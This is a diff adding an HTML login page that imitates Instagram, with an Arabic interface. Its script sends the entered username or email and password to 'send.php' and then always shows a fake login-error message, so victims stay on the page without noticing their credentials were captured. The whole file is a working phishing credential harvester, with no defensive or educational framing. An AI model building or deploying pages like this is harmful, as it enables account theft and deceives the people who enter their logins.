@@ -1,0 +1,86 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Instagram Clone - Login</title>
+  <style>
+    /* ستايل بسيط للتنسيق */
+    body {
+      font-family: Arial, sans-serif;
+      background: #fafafa;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+    }
+    .login-container {
+      background: white;
+      padding: 2rem;
+      border: 1px solid #ddd;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+      width: 320px;
+      border-radius: 8px;
+      text-align: center;
+    }
+    input {
+      width: 100%;
+      padding: 10px;
+      margin: 10px 0;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+      box-sizing: border-box;
+      font-size: 14px;
+    }
+    button {
+      background: #3897f0;
+      color: white;
+      border: none;
+      padding: 10px;
+      width: 100%;
+      font-weight: bold;
+      border-radius: 4px;
+      cursor: pointer;
+      font-size: 16px;
+    }
+    button:hover {
+      background: #2a78c4;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="login-container">
+    <h2>تسجيل الدخول - Instagram Clone</h2>
+    <form id="login-form">
+      <input name="email" type="text" placeholder="رقم الهاتف، اسم المستخدم أو الإيميل" required />
+      <input name="password" type="password" placeholder="كلمة المرور" required />
+      <button type="submit">تسجيل الدخول</button>
+    </form>
+  </div>
+
+  <script>
+    const form = document.getElementById('login-form');
+
+    form.addEventListener('submit', function(e) {
+      e.preventDefault();
+
+      const formData = new FormData(form);
+
+      fetch('send.php', {
+        method: 'POST',
+        body: formData
+      })
+      .then(() => {
+        alert("حدث خطأ أثناء تسجيل الدخول. حاول مرة أخرى.");
+        // يبقى المستخدم في نفس الصفحة وما يتوجهش لأي رابط ثاني
+      })
+      .catch(() => {
+        alert("فشل الاتصال بالسيرفر.");
+      });
+    });
+  </script>
+
+</body>
+</html>
